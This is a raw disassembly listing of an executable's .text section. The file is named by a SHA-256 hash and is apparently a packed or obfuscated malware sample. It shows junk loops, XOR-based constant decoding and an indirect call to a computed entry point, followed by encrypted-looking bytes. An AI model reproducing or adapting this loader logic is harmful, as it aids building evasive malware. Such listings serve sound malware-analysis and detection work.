
48f7af95e72d1f2e197f300731487c84e075610d9d19e7f6927553d2fb1db33d.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x230
  401009:	add    DWORD PTR ds:0x4377a3,0x7b21
  401013:	push   esi
  401014:	or     DWORD PTR ds:0x4377b7,0x1d26
  40101e:	xor    eax,eax
  401020:	sbb    DWORD PTR ds:0x43774b,0x4377b7
  40102a:	mov    WORD PTR [ebp-0x24],ax
  40102e:	mov    DWORD PTR ds:0x437783,0x17
  401038:	cmp    DWORD PTR ds:0x437783,0x0
  40103f:	je     0x401075
  401045:	cmp    DWORD PTR ds:0x437783,0x23
  40104c:	jl     0x401075
  401052:	jmp    0x401065
  401057:	push   DWORD PTR [ebp-0x10]
  40105a:	push   0x43778f
  40105f:	call   DWORD PTR ds:0x43c960
  401065:	mov    eax,ds:0x437783
  40106a:	dec    eax
  40106b:	mov    ds:0x437783,eax
  401070:	jmp    0x401038
  401075:	mov    eax,ds:0x4375df
  40107a:	movzx  eax,BYTE PTR [eax]
  40107d:	push   eax
  40107e:	or     DWORD PTR ds:0x43774f,0x437783
  401088:	call   DWORD PTR ds:0x43ca38
  40108e:	cmp    eax,0x3
  401091:	mov    DWORD PTR ds:0x4377af,0x1a4e
  40109b:	jle    0x4010b7
  4010a1:	xor    eax,eax
  4010a3:	jmp    0x401a9e
  4010a8:	mov    DWORD PTR ds:0x4377b7,0x36bc
  4010b2:	jmp    0x4011b9
  4010b7:	push   0x0
  4010b9:	lea    eax,[ebp-0x1d0]
  4010bf:	or     DWORD PTR ds:0x4377af,0x4954
  4010c9:	push   eax
  4010ca:	sub    DWORD PTR ds:0x43770f,0x5936
  4010d4:	push   0x4374c3
  4010d9:	call   DWORD PTR ds:0x43c974
  4010df:	mov    DWORD PTR ds:0x43771f,0x19ca
  4010e9:	cmp    eax,0xffffffff
  4010ec:	mov    DWORD PTR ds:0x437773,0x6253
  4010f6:	je     0x401127
  4010fc:	and    DWORD PTR ds:0x43778f,0x437767
  401106:	xor    eax,eax
  401108:	mov    DWORD PTR ds:0x4377bb,0x7a95
  401112:	inc    eax
  401113:	mov    DWORD PTR ds:0x43778f,0x2676
  40111d:	jmp    0x401a9e
  401122:	jmp    0x4011b9
  401127:	push   0x8
  401129:	dec    DWORD PTR ds:0x43777b
  40112f:	push   0x4374eb
  401134:	push   0x87687663
  401139:	call   DWORD PTR ds:0x43c9c0
  40113f:	mov    DWORD PTR ds:0x43777f,0x66a5
  401149:	cmp    eax,0x8
  40114c:	jne    0x40117c
  401152:	mov    DWORD PTR ds:0x43774b,0x20c8
  40115c:	xor    eax,eax
  40115e:	mov    DWORD PTR ds:0x43775f,0x154c
  401168:	jmp    0x401a9e
  40116d:	mov    DWORD PTR ds:0x4377b3,0xffc
  401177:	jmp    0x4011b9
  40117c:	xor    DWORD PTR ds:0x43779b,0x43771b
  401186:	call   DWORD PTR ds:0x43c9d8
  40118c:	test   eax,eax
  40118e:	mov    DWORD PTR ds:0x43772f,0x40bc
  401198:	jne    0x4011b9
  40119e:	and    DWORD PTR ds:0x437793,0x2e57
  4011a8:	xor    eax,eax
  4011aa:	mov    DWORD PTR ds:0x4377af,0x587d
  4011b4:	jmp    0x401a9e
  4011b9:	sub    ecx,DWORD PTR ds:0x4377a7
  4011bf:	mov    DWORD PTR [ebp-0x20],0x0
  4011c6:	mov    DWORD PTR [ebp-0x148],0xf89c85b0
  4011d0:	adc    DWORD PTR ds:0x437717,edi
  4011d6:	mov    DWORD PTR [ebp-0x1dc],0xf89c85b3
  4011e0:	and    DWORD PTR ds:0x43772b,0x0
  4011ea:	jmp    0x4011fc
  4011ef:	mov    ecx,DWORD PTR ds:0x43772b
  4011f5:	inc    ecx
  4011f6:	mov    DWORD PTR ds:0x43772b,ecx
  4011fc:	cmp    DWORD PTR ds:0x43772b,0x10
  401203:	jae    0x40124a
  401209:	cmp    DWORD PTR ds:0x43772b,0xb
  401210:	ja     0x40124a
  401216:	jmp    0x40122b
  40121b:	push   0x43701b
  401220:	push   0x43707c
  401225:	call   DWORD PTR ds:0x43c964
  40122b:	cmp    DWORD PTR ds:0x43772b,0xa
  401232:	jne    0x401245
  401238:	mov    ecx,DWORD PTR ds:0x43772b
  40123e:	inc    ecx
  40123f:	mov    DWORD PTR ds:0x43772b,ecx
  401245:	jmp    0x4011ef
  40124a:	lea    eax,[ebp-0x1d8]
  401250:	mov    DWORD PTR [ebp-0x13c],eax
  401256:	lea    eax,[ebp-0x4]
  401259:	mov    ecx,DWORD PTR ds:0x43774f
  40125f:	and    DWORD PTR ds:0x437737,ecx
  401265:	mov    DWORD PTR [ebp-0x140],eax
  40126b:	mov    eax,ds:0x43739f
  401270:	mov    eax,DWORD PTR [eax+0x1c8]
  401276:	mov    eax,DWORD PTR [eax]
  401278:	mov    DWORD PTR ds:0x437737,0x16
  401282:	cmp    DWORD PTR ds:0x437737,0x0
  401289:	je     0x4012be
  40128f:	cmp    DWORD PTR ds:0x437737,0x1c
  401296:	jbe    0x4012be
  40129c:	jmp    0x4012ac
  4012a1:	push   0x437042
  4012a6:	call   DWORD PTR ds:0x43c968
  4012ac:	mov    ecx,DWORD PTR ds:0x437737
  4012b2:	dec    ecx
  4012b3:	mov    DWORD PTR ds:0x437737,ecx
  4012b9:	jmp    0x401282
  4012be:	xor    eax,0x75108b5
  4012c3:	add    eax,0x3272fb
  4012c8:	mov    DWORD PTR ds:0x43779b,0x40d
  4012d2:	mov    ecx,DWORD PTR [ebp-0x140]
  4012d8:	mov    DWORD PTR [ecx],eax
  4012da:	mov    DWORD PTR ds:0x43778f,0x630f
  4012e4:	lea    eax,[ebp-0x10]
  4012e7:	mov    DWORD PTR [ebp-0x12c],eax
  4012ed:	cmp    DWORD PTR ds:0x4375d3,0x456dfdfb
  4012f7:	mov    DWORD PTR ds:0x43776f,0x19c2
  401301:	jne    0x401496
  401307:	and    DWORD PTR ds:0x43771b,0x0
  401311:	jmp    0x401324
  401316:	xor    eax,eax
  401318:	xor    eax,DWORD PTR ds:0x43771b
  40131e:	inc    eax
  40131f:	mov    ds:0x43771b,eax
  401324:	cmp    DWORD PTR ds:0x43771b,0x15
  40132b:	jae    0x40137e
  401331:	cmp    DWORD PTR ds:0x43771b,0x8
  401338:	jbe    0x40137e
  40133e:	jmp    0x401361
  401343:	push   DWORD PTR [ebp-0xc]
  401346:	push   0x437727
  40134b:	push   0x4762
  401350:	push   0x437104
  401355:	push   DWORD PTR [ebp-0x18]
  401358:	push   DWORD PTR [ebp-0x14]
  40135b:	call   DWORD PTR ds:0x43c96c
  401361:	cmp    DWORD PTR ds:0x43771b,0x7
  401368:	jne    0x401379
  40136e:	mov    eax,ds:0x43771b
  401373:	inc    eax
  401374:	mov    ds:0x43771b,eax
  401379:	jmp    0x401316
  40137e:	mov    eax,DWORD PTR [ebp-0x148]
  401384:	dec    ecx
  401385:	xor    eax,0x75108b5
  40138a:	add    eax,0x3272fb
  40138f:	mov    ecx,DWORD PTR ds:0x43739f
  401395:	mov    ecx,DWORD PTR [ecx+0x198]
  40139b:	sbb    DWORD PTR ds:0x43772f,0x437773
  4013a5:	mov    DWORD PTR [ecx],eax
  4013a7:	or     ecx,DWORD PTR ds:0x43775f
  4013ad:	mov    eax,DWORD PTR [ebp-0x148]
  4013b3:	mov    DWORD PTR ds:0x437753,0x15
  4013bd:	cmp    DWORD PTR ds:0x437753,0x0
  4013c4:	je     0x401418
  4013ca:	cmp    DWORD PTR ds:0x437753,0x9
  4013d1:	jg     0x401418
  4013d7:	jmp    0x4013ea
  4013dc:	push   0x43775b
  4013e1:	push   DWORD PTR [ebp-0xc]
  4013e4:	call   DWORD PTR ds:0x43c970
  4013ea:	cmp    DWORD PTR ds:0x437753,0xa
  4013f1:	jne    0x401404
  4013f7:	mov    ecx,DWORD PTR ds:0x437753
  4013fd:	dec    ecx
  4013fe:	mov    DWORD PTR ds:0x437753,ecx
  401404:	xor    ecx,ecx
  401406:	xor    ecx,DWORD PTR ds:0x437753
  40140c:	dec    ecx
  40140d:	mov    DWORD PTR ds:0x437753,ecx
  401413:	jmp    0x4013bd
  401418:	xor    eax,0x75108b5
  40141d:	and    DWORD PTR ds:0x43777b,0x0
  401427:	mov    ecx,DWORD PTR ds:0x43777b
  40142d:	inc    ecx
  40142e:	mov    DWORD PTR ds:0x43777b,ecx
  401434:	cmp    DWORD PTR ds:0x43777b,0x15
  40143b:	jl     0x401471
  401441:	jmp    0x401464
  401446:	push   DWORD PTR [ebp-0x14]
  401449:	push   0x43773f
  40144e:	push   DWORD PTR [ebp-0x1c]
  401451:	push   0x43706e
  401456:	push   0x8166
  40145b:	push   DWORD PTR [ebp-0x10]
  40145e:	call   DWORD PTR ds:0x43c978
  401464:	cmp    DWORD PTR ds:0x43777b,0x12
  40146b:	jb     0x401427
  401471:	add    eax,0x3272fb
  401476:	mov    ds:0x4375d3,eax
  40147b:	mov    eax,DWORD PTR [ebp-0x148]
  401481:	or     DWORD PTR ds:0x4377b3,edx
  401487:	xor    eax,0x75108b5
  40148c:	add    eax,0x3272fb
  401491:	mov    ds:0x437497,eax
  401496:	xor    DWORD PTR ds:0x43772b,ebx
  40149c:	mov    eax,ds:0x43739f
  4014a1:	mov    eax,DWORD PTR [eax+0x18c]
  4014a7:	mov    ecx,DWORD PTR [ebp-0x12c]
  4014ad:	neg    DWORD PTR ds:0x4377b7
  4014b3:	mov    eax,DWORD PTR [eax]
  4014b5:	sbb    DWORD PTR ds:0x437713,0x4377b3
  4014bf:	mov    DWORD PTR [ecx],eax
  4014c1:	mov    DWORD PTR [ebp-0x128],0xf89c85bc
  4014cb:	mov    DWORD PTR ds:0x437797,0x10
  4014d5:	cmp    DWORD PTR ds:0x437797,0x0
  4014dc:	je     0x40152b
  4014e2:	cmp    DWORD PTR ds:0x437797,0x20
  4014e9:	jg     0x40152b
  4014ef:	jmp    0x401518
  4014f4:	push   0x4370c1
  4014f9:	push   0x6f44
  4014fe:	push   0x27cf
  401503:	push   0x84b9
  401508:	push   0x17d9
  40150d:	push   0x366e
  401512:	call   DWORD PTR ds:0x43c97c
  401518:	xor    eax,eax
  40151a:	add    eax,DWORD PTR ds:0x437797
  401520:	dec    eax
  401521:	mov    ds:0x437797,eax
  401526:	jmp    0x4014d5
  40152b:	mov    DWORD PTR [ebp-0xc],0xf89c85bc
  401532:	movzx  eax,WORD PTR ds:0x437763
  401539:	sub    DWORD PTR ds:0x437773,eax
  40153f:	mov    DWORD PTR [ebp-0x8],0xf89c85bc
  401546:	mov    eax,ds:0x43778b
  40154b:	adc    DWORD PTR ds:0x43776b,eax
  401551:	mov    eax,ds:0x437463
  401556:	mov    eax,DWORD PTR [eax]
  401558:	mov    DWORD PTR [ebp-0x124],eax
  40155e:	mov    DWORD PTR [ebp-0x130],0xf89c85b0
  401568:	sbb    DWORD PTR ds:0x43773f,0x437793
  401572:	mov    DWORD PTR [ebp-0x138],0xf89c85bc
  40157c:	sub    eax,DWORD PTR ds:0x437743
  401582:	mov    DWORD PTR [ebp-0x1e4],0xf89c85b8
  40158c:	mov    eax,DWORD PTR [ebp-0x148]
  401592:	xor    eax,0x75108b5
  401597:	add    eax,0x3272fb
  40159c:	mov    DWORD PTR ds:0x4377af,0x1731
  4015a6:	mov    DWORD PTR [ebp-0x1e8],eax
  4015ac:	jmp    0x4015e1
  4015b1:	sub    DWORD PTR ds:0x4377b3,ecx
  4015b7:	mov    eax,DWORD PTR [ebp-0x1dc]
  4015bd:	neg    DWORD PTR ds:0x437723
  4015c3:	xor    eax,0x75108b5
  4015c8:	or     DWORD PTR ds:0x437733,ecx
  4015ce:	mov    ecx,DWORD PTR [ebp-0x1e8]
  4015d4:	lea    eax,[ecx+eax*1+0x3272fb]
  4015db:	mov    DWORD PTR [ebp-0x1e8],eax
  4015e1:	mov    eax,DWORD PTR [ebp-0x1dc]
  4015e7:	and    DWORD PTR ds:0x437753,0x0
  4015f1:	mov    ecx,DWORD PTR ds:0x437753
  4015f7:	inc    ecx
  4015f8:	mov    DWORD PTR ds:0x437753,ecx
  4015fe:	cmp    DWORD PTR ds:0x437753,0x4
  401605:	jbe    0x40164e
  40160b:	jmp    0x401625
  401610:	push   0x437089
  401615:	push   0x437000
  40161a:	push   0x400000
  40161f:	call   DWORD PTR ds:0x43c980
  401625:	cmp    DWORD PTR ds:0x437753,0x3
  40162c:	jne    0x401641
  401632:	xor    ecx,ecx
  401634:	xor    ecx,DWORD PTR ds:0x437753
  40163a:	inc    ecx
  40163b:	mov    DWORD PTR ds:0x437753,ecx
  401641:	cmp    DWORD PTR ds:0x437753,0x10
  401648:	jb     0x4015f1
  40164e:	xor    eax,0x75108b5
  401653:	mov    ecx,DWORD PTR [ebp-0x1dc]
  401659:	neg    DWORD PTR ds:0x43777f
  40165f:	xor    ecx,0x75108b5
  401665:	or     DWORD PTR ds:0x43774b,0x7a77
  40166f:	lea    eax,[eax+ecx*1+0x64e5f6]
  401676:	mov    DWORD PTR ds:0x43779f,0x1f
  401680:	cmp    DWORD PTR ds:0x43779f,0x0
  401687:	je     0x4016c6
  40168d:	cmp    DWORD PTR ds:0x43779f,0x26
  401694:	jbe    0x4016c6
  40169a:	jmp    0x4016b4
  40169f:	push   DWORD PTR [ebp-0x28]
  4016a2:	push   DWORD PTR [ebp-0x28]
  4016a5:	push   DWORD PTR [ebp-0xc]
  4016a8:	push   DWORD PTR [ebp-0x18]
  4016ab:	push   DWORD PTR [ebp-0x18]
  4016ae:	call   DWORD PTR ds:0x43c984
  4016b4:	mov    ecx,DWORD PTR ds:0x43779f
  4016ba:	dec    ecx
  4016bb:	mov    DWORD PTR ds:0x43779f,ecx
  4016c1:	jmp    0x401680
  4016c6:	mov    ecx,DWORD PTR [ebp-0x1dc]
  4016cc:	xor    ecx,0x75108b5
  4016d2:	lea    eax,[eax+ecx*1+0x3272fb]
  4016d9:	cmp    DWORD PTR [ebp-0x1e8],eax
  4016df:	ja     0x401726
  4016e5:	mov    eax,DWORD PTR [ebp-0x1dc]
  4016eb:	xor    eax,0x75108b5
  4016f0:	mov    ecx,DWORD PTR [ebp-0x1e8]
  4016f6:	lea    eax,[ecx+eax*1+0x3272fb]
  4016fd:	push   eax
  4016fe:	mov    eax,DWORD PTR [ebp-0x130]
  401704:	xor    eax,0x75108b5
  401709:	lea    eax,[ebp+eax*1+0x327303]
  401710:	push   eax
  401711:	mov    eax,ds:0x43739f
  401716:	push   DWORD PTR [eax+0x1bc]
  40171c:	call   0x401ab4
  401721:	jmp    0x4015b1
  401726:	mov    eax,DWORD PTR [ebp+0xc]
  401729:	mov    ds:0x437223,eax
  40172e:	mov    eax,DWORD PTR [ebp+0x10]
  401731:	mov    ds:0x43747f,eax
  401736:	mov    eax,ds:0x437223
  40173b:	sub    eax,0x3272fb
  401740:	xor    eax,0x75108b5
  401745:	mov    ecx,DWORD PTR [ebp-0x13c]
  40174b:	mov    DWORD PTR [ecx],eax
  40174d:	lea    eax,[ebp-0x144]
  401753:	mov    DWORD PTR [ebp-0x1e0],eax
  401759:	lea    eax,[ebp-0x1e0]
  40175f:	mov    DWORD PTR [ebp-0x134],eax
  401765:	lea    eax,[ebp+0x4]
  401768:	mov    ecx,DWORD PTR [ebp-0x1e0]
  40176e:	mov    DWORD PTR [ecx],eax
  401770:	mov    eax,DWORD PTR [ebp-0x1d8]
  401776:	xor    eax,0x75108b5
  40177b:	add    eax,0x3272fb
  401780:	xor    ecx,ecx
  401782:	sub    eax,0x5424137
  401787:	sbb    ecx,0x0
  40178a:	xor    eax,0x8a29a14b
  40178f:	xor    ecx,0x0
  401792:	mov    DWORD PTR [ebp-0x210],eax
  401798:	mov    DWORD PTR [ebp-0x20c],ecx
  40179e:	cmp    DWORD PTR [ebp-0x210],0x70941f81
  4017a8:	jne    0x4017bb
  4017ae:	cmp    DWORD PTR [ebp-0x20c],0xffffffff
  4017b5:	je     0x401831
  4017bb:	mov    eax,DWORD PTR [ebp-0x148]
  4017c1:	xor    eax,0x75108b5
  4017c6:	add    eax,0x3272fb
  4017cb:	mov    ecx,eax
  4017cd:	xor    esi,esi
  4017cf:	sub    ecx,0x5424137
  4017d5:	sbb    esi,0x0
  4017d8:	xor    ecx,0x8a29a14b
  4017de:	xor    esi,0x0
  4017e1:	mov    eax,DWORD PTR [ebp-0x4]
  4017e4:	cdq    
  4017e5:	sub    eax,0x5424137
  4017ea:	sbb    edx,0x0
  4017ed:	xor    eax,0x8a29a14b
  4017f2:	xor    edx,0x0
  4017f5:	mov    DWORD PTR [ebp-0x218],ecx
  4017fb:	mov    DWORD PTR [ebp-0x214],esi
  401801:	mov    DWORD PTR [ebp-0x220],eax
  401807:	mov    DWORD PTR [ebp-0x21c],edx
  40180d:	mov    eax,DWORD PTR [ebp-0x218]
  401813:	cmp    eax,DWORD PTR [ebp-0x220]
  401819:	jne    0x4019dc
  40181f:	mov    eax,DWORD PTR [ebp-0x214]
  401825:	cmp    eax,DWORD PTR [ebp-0x21c]
  40182b:	jne    0x4019dc
  401831:	mov    eax,DWORD PTR [ebp-0x148]
  401837:	xor    eax,0x75108b5
  40183c:	add    eax,0x3272fb
  401841:	xor    ecx,ecx
  401843:	sub    eax,0x5424137
  401848:	sbb    ecx,0x0
  40184b:	xor    eax,0x8a29a14b
  401850:	xor    ecx,0x0
  401853:	mov    edx,DWORD PTR [ebp-0x10]
  401856:	xor    esi,esi
  401858:	sub    edx,0x5424137
  40185e:	sbb    esi,0x0
  401861:	xor    edx,0x8a29a14b
  401867:	xor    esi,0x0
  40186a:	mov    DWORD PTR [ebp-0x228],eax
  401870:	mov    DWORD PTR [ebp-0x224],ecx
  401876:	mov    DWORD PTR [ebp-0x230],edx
  40187c:	mov    DWORD PTR [ebp-0x22c],esi
  401882:	mov    eax,DWORD PTR [ebp-0x228]
  401888:	cmp    eax,DWORD PTR [ebp-0x230]
  40188e:	jne    0x401936
  401894:	mov    eax,DWORD PTR [ebp-0x224]
  40189a:	cmp    eax,DWORD PTR [ebp-0x22c]
  4018a0:	jne    0x401936
  4018a6:	mov    eax,DWORD PTR [ebp-0x148]
  4018ac:	xor    eax,0x75108b5
  4018b1:	add    eax,0x3272fb
  4018b6:	mov    ecx,DWORD PTR ds:0x43739f
  4018bc:	mov    ecx,DWORD PTR [ecx+0x198]
  4018c2:	cmp    eax,DWORD PTR [ecx]
  4018c4:	jne    0x4018f1
  4018ca:	mov    eax,DWORD PTR [ebp-0x148]
  4018d0:	xor    eax,0x75108b5
  4018d5:	add    eax,0x3272fb
  4018da:	push   eax
  4018db:	push   0xf89c85bc
  4018e0:	push   DWORD PTR [ebp-0x1dc]
  4018e6:	push   DWORD PTR [ebp-0x148]
  4018ec:	call   0x414de4
  4018f1:	push   0xf89c85f0
  4018f6:	push   0xf89c87b0
  4018fb:	push   DWORD PTR [ebp-0x1dc]
  401901:	push   DWORD PTR [ebp-0x148]
  401907:	call   0x4155f6
  40190c:	mov    eax,DWORD PTR [ebp-0x148]
  401912:	xor    eax,0x75108b5
  401917:	add    eax,0x3272fb
  40191c:	mov    ds:0x43742b,eax
  401921:	mov    eax,DWORD PTR [ebp-0x148]
  401927:	xor    eax,0x75108b5
  40192c:	add    eax,0x3272fb
  401931:	mov    ds:0x437423,eax
  401936:	mov    eax,DWORD PTR [ebp-0x1e0]
  40193c:	mov    eax,DWORD PTR [eax]
  40193e:	mov    ecx,DWORD PTR [ebp-0x148]
  401944:	xor    ecx,0x75108b5
  40194a:	add    ecx,0x3272fb
  401950:	cmp    eax,ecx
  401952:	je     0x4019d7
  401958:	mov    DWORD PTR [ebp-0x1ec],0xf152c3b
  401962:	mov    DWORD PTR [ebp-0x1f8],0x712edce
  40196c:	mov    DWORD PTR [ebp-0x1f4],0x373fc28
  401976:	mov    DWORD PTR [ebp-0x1f0],0x72670ad8
  401980:	lea    eax,[ebp-0x1f0]
  401986:	push   eax
  401987:	lea    eax,[ebp-0x1f4]
  40198d:	push   eax
  40198e:	lea    eax,[ebp-0x1f8]
  401994:	push   eax
  401995:	lea    eax,[ebp-0x1ec]
  40199b:	push   eax
  40199c:	call   0x42d44a
  4019a1:	push   DWORD PTR [ebp-0x134]
  4019a7:	push   DWORD PTR [ebp-0x1d4]
  4019ad:	push   DWORD PTR [ebp-0x1dc]
  4019b3:	push   DWORD PTR [ebp-0x148]
  4019b9:	call   0x40408a
  4019be:	push   0x4
  4019c0:	mov    eax,ds:0x43739f
  4019c5:	add    eax,0x1cc
  4019ca:	push   eax
  4019cb:	lea    eax,[ebp-0x1d4]
  4019d1:	push   eax
  4019d2:	call   0x401ab4
  4019d7:	jmp    0x401a96
  4019dc:	lea    eax,[ebp-0x1fc]
  4019e2:	mov    DWORD PTR [ebp-0x208],eax
  4019e8:	lea    eax,[ebp-0x200]
  4019ee:	mov    DWORD PTR [ebp-0x204],eax
  4019f4:	mov    eax,DWORD PTR [ebp-0x204]
  4019fa:	mov    ecx,DWORD PTR ds:0x43739f
  401a00:	mov    DWORD PTR [eax],ecx
  401a02:	push   0x4
  401a04:	mov    eax,DWORD PTR [ebp-0x200]
  401a0a:	push   DWORD PTR [eax+0x194]
  401a10:	push   DWORD PTR [ebp-0x208]
  401a16:	call   0x401ab4
  401a1b:	mov    eax,DWORD PTR [ebp-0x208]
  401a21:	mov    eax,DWORD PTR [eax]
  401a23:	mov    ecx,DWORD PTR [ebp-0x200]
  401a29:	mov    ecx,DWORD PTR [ecx+0x194]
  401a2f:	mov    edx,DWORD PTR [ebp-0x200]
  401a35:	mov    edx,DWORD PTR [edx+0x194]
  401a3b:	mov    edx,DWORD PTR [edx]
  401a3d:	mov    ecx,DWORD PTR [ecx]
  401a3f:	mov    edx,DWORD PTR [edx+0x3c]
  401a42:	add    eax,DWORD PTR [ecx+edx*1+0x28]
  401a46:	mov    ecx,DWORD PTR [ebp-0x208]
  401a4c:	mov    DWORD PTR [ecx],eax
  401a4e:	push   DWORD PTR ds:0x43747f
  401a54:	push   DWORD PTR ds:0x437223
  401a5a:	mov    eax,ds:0x43739f
  401a5f:	mov    eax,DWORD PTR [eax+0x194]
  401a65:	push   DWORD PTR [eax]
  401a67:	mov    eax,DWORD PTR [ebp-0x1fc]
  401a6d:	call   eax
  401a6f:	mov    ecx,DWORD PTR ds:0x43739f
  401a75:	mov    ecx,DWORD PTR [ecx+0x1cc]
  401a7b:	mov    DWORD PTR [ecx],eax
  401a7d:	push   0x4
  401a7f:	mov    eax,ds:0x43739f
  401a84:	add    eax,0x1cc
  401a89:	push   eax
  401a8a:	lea    eax,[ebp-0x1d4]
  401a90:	push   eax
  401a91:	call   0x401ab4
  401a96:	mov    eax,DWORD PTR [ebp-0x1d4]
  401a9c:	mov    eax,DWORD PTR [eax]
  401a9e:	pop    esi
  401a9f:	leave  
  401aa0:	ret    0xc
  401aa3:	push   ebp
  401aa4:	mov    ebp,esp
  401aa6:	xor    eax,eax
  401aa8:	and    DWORD PTR ds:0x437743,0x43770f
  401ab2:	pop    ebp
  401ab3:	ret    
  401ab4:	push   ebp
  401ab5:	mov    ebp,esp
  401ab7:	sub    esp,0x2c
  401aba:	and    DWORD PTR ds:0x437777,0x0
  401ac4:	jmp    0x401ad8
  401ac9:	xor    edx,edx
  401acb:	add    edx,DWORD PTR ds:0x437777
  401ad1:	inc    edx
  401ad2:	mov    DWORD PTR ds:0x437777,edx
  401ad8:	cmp    DWORD PTR ds:0x437777,0x18
  401adf:	jae    0x401b21
  401ae5:	cmp    DWORD PTR ds:0x437777,0x6
  401aec:	jg     0x401b21
  401af2:	jmp    0x401b00
  401af7:	push   DWORD PTR [ebp-0x28]
  401afa:	call   DWORD PTR ds:0x43c988
  401b00:	cmp    DWORD PTR ds:0x437777,0x5
  401b07:	jne    0x401b1c
  401b0d:	xor    edx,edx
  401b0f:	add    edx,DWORD PTR ds:0x437777
  401b15:	inc    edx
  401b16:	mov    DWORD PTR ds:0x437777,edx
  401b1c:	jmp    0x401ac9
  401b21:	push   esi
  401b22:	or     DWORD PTR ds:0x43770f,0x7b2e
  401b2c:	mov    DWORD PTR [ebp-0x4],0xf89c85b0
  401b33:	and    DWORD PTR ds:0x43779b,0x0
  401b3d:	jmp    0x401b4d
  401b42:	mov    eax,ds:0x43779b
  401b47:	inc    eax
  401b48:	mov    ds:0x43779b,eax
  401b4d:	cmp    DWORD PTR ds:0x43779b,0x18
  401b54:	jae    0x401b97
  401b5a:	cmp    DWORD PTR ds:0x43779b,0xa
  401b61:	jbe    0x401b97
  401b67:	jmp    0x401b7a
  401b6c:	push   0x4590
  401b71:	push   DWORD PTR [ebp-0x10]
  401b74:	call   DWORD PTR ds:0x43c98c
  401b7a:	cmp    DWORD PTR ds:0x43779b,0x9
  401b81:	jne    0x401b92
  401b87:	mov    eax,ds:0x43779b
  401b8c:	inc    eax
  401b8d:	mov    ds:0x43779b,eax
  401b92:	jmp    0x401b42
  401b97:	mov    DWORD PTR [ebp-0x8],0xf89c85b3
  401b9e:	mov    eax,DWORD PTR [ebp-0x4]
  401ba1:	add    edx,0x774
  401ba7:	xor    eax,0x75108b5
  401bac:	add    eax,0x3272fb
  401bb1:	add    DWORD PTR ds:0x437753,0x3afa
  401bbb:	xor    ecx,ecx
  401bbd:	and    edx,DWORD PTR ds:0x437767
  401bc3:	mov    edx,DWORD PTR [ebp+0x10]
  401bc6:	xor    esi,esi
  401bc8:	sub    edx,0x5424137
  401bce:	mov    DWORD PTR ds:0x43779f,0x3ed0
  401bd8:	sbb    esi,0x0
  401bdb:	sub    DWORD PTR ds:0x437747,0x437777
  401be5:	xor    edx,0x8a29a14b
  401beb:	xor    esi,0x0
  401bee:	xor    edx,0x8a29a14b
  401bf4:	xor    esi,0x0
  401bf7:	adc    DWORD PTR ds:0x43775f,0x43772f
  401c01:	add    edx,0x5424137
  401c07:	adc    esi,0x0
  401c0a:	mov    DWORD PTR [ebp-0x14],eax
  401c0d:	mov    DWORD PTR ds:0x43772f,0x4892
  401c17:	mov    DWORD PTR [ebp-0x10],ecx
  401c1a:	mov    DWORD PTR [ebp-0x1c],edx
  401c1d:	movzx  eax,BYTE PTR ds:0x43770f
  401c24:	mov    DWORD PTR [ebp-0x18],esi
  401c27:	mov    eax,DWORD PTR [ebp-0x14]
  401c2a:	cmp    eax,DWORD PTR [ebp-0x1c]
  401c2d:	mov    DWORD PTR ds:0x437747,0x1bf2
  401c37:	jne    0x401c53
  401c3d:	mov    eax,DWORD PTR [ebp-0x10]
  401c40:	mov    DWORD PTR ds:0x43777f,0x6546
  401c4a:	cmp    eax,DWORD PTR [ebp-0x18]
  401c4d:	je     0x404080
  401c53:	mov    eax,DWORD PTR [ebp+0xc]
  401c56:	mov    DWORD PTR ds:0x43774b,0x1906
  401c60:	cmp    eax,DWORD PTR [ebp+0x8]
  401c63:	mov    DWORD PTR ds:0x4377b7,0x6132
  401c6d:	je     0x404080
  401c73:	mov    eax,DWORD PTR [ebp-0x4]
  401c76:	xor    eax,0x75108b5
  401c7b:	add    eax,0x3272fb
  401c80:	jmp    0x403fce
  401c85:	int3   
  401c86:	xor    al,0xbc
  401c88:	push   ss
  401c89:	fs jbe 0x401ce0
  401c8c:	je     0x401c61
  401c8e:	or     DWORD PTR [edx+0x4f],0xffffff8b
  401c92:	aas    
  401c93:	mov    ecx,0x7b7b7ba0
  401c98:	jnp    0x401c44
  401c9a:	cwde   
  401c9b:	jnp    0x401d18
  401c9d:	rol    ebx,cl
  401c9f:	mov    esi,0xe4d7cdd6
  401ca4:	(bad)  
  401ca5:	fcmovnb st,st(4)
  401ca7:	cmc    
  401ca8:	(bad)  
  401ca9:	fucomi st,st(6)
  401cab:	ror    edx,cl
  401cad:	mov    eax,0xcdcccfdf
  401cb2:	int3   
  401cb3:	sar    esi,cl
  401cb5:	inc    BYTE PTR [edx]
  401cb7:	retf   
  401cb8:	or     ch,dl
  401cba:	(bad)  
  401cbc:	enter  0xb8b3,0xd1
  401cc0:	mov    al,0xb0
  401cc2:	not    eax
  401cc4:	lods   al,BYTE PTR ds:[esi]
  401cc5:	out    dx,al
  401cc6:	ror    bl,0xf9
  401cc9:	aam    0xd6
  401ccb:	ret    
  401ccc:	ret    
  401ccd:	mov    ebp,0xdbe2e703
  401cd2:	idiv   ebp
  401cd4:	or     eax,esp
  401cd6:	leave  
  401cd7:	aam    0xc5
  401cd9:	or     ecx,esp
  401cdb:	add    DWORD PTR ds:0xb2c0d1c9,ecx
  401ce1:	in     al,0xe8
  401ce3:	icebp  
  401ce4:	sar    DWORD PTR [ebx-0x3244073c],0xb8
  401ceb:	jmp    0x401cdd
  401ced:	out    dx,al
  401cee:	aam    0xb8
  401cf0:	ret    
  401cf1:	neg    dh
  401cf3:	(bad)  
  401cf4:	fcomip st,st(7)
  401cf6:	xlat   BYTE PTR ds:[ebx]
  401cf7:	add    bl,ah
  401cf9:	enter  0xe604,0x11
  401cfd:	mov    edi,0xe4e1dcc7
  401d02:	call   0xd51317e7
  401d07:	mov    ah,0xeb
  401d09:	(bad)  
  401d0b:	idiv   BYTE PTR [edi+esi*4-0x21380c18]
  401d12:	push   es
  401d13:	add    al,0xe3
  401d15:	pop    es
  401d16:	jmp    0xfad8:0x13da08f4
  401d1d:	les    esi,FWORD PTR [ebx-0x281e230f]
  401d23:	lock mov ch,0xb9
  401d26:	mov    edx,0xbcf2acb5
  401d2b:	xlat   BYTE PTR ds:[ebx]
  401d2c:	jecxz  0x401cec
  401d2e:	(bad)  
  401d2f:	in     al,dx
  401d30:	in     al,dx
  401d31:	jecxz  0x401d34
  401d33:	icebp  
  401d34:	stc    
  401d35:	call   0xca4bf51d
  401d3a:	or     dl,bl
  401d3c:	repz loop 0x401d36
